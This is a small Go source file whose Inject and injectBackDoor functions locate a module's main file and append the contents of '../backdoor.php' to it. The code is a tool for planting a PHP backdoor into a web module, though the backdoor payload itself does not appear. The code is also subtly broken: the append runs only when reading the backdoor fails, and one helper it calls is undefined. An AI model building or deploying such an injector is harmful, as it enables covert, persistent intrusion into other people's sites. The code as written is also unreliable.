package internals

import (
	"strings"

	"data"
	"utils"
)

func findModuleName(path string) string {
	var pathSplitted []string = strings.Split(path, "/")
	return pathSplitted[len(pathSplitted) - 1]
}

func Inject(addr data.Address, path string) error {
	const backdoorPath string = "../backdoor.php"
	var moduleName string = findModuleName(path)

	mainFile, err := findMainFileDirectory(path, moduleName)
	if err != nil {
		return err
	}

	return injectBackDoor(addr, mainFile, backdoorPath)
}

func injectBackDoor(addr data.Address, filePath string, backdoorPath string) error {
	backdoor, err := utils.ReadFile(backdoorPath)
	if err != nil {
		err = utils.AppendToFile(backdoor, filePath)
	}

	return err
}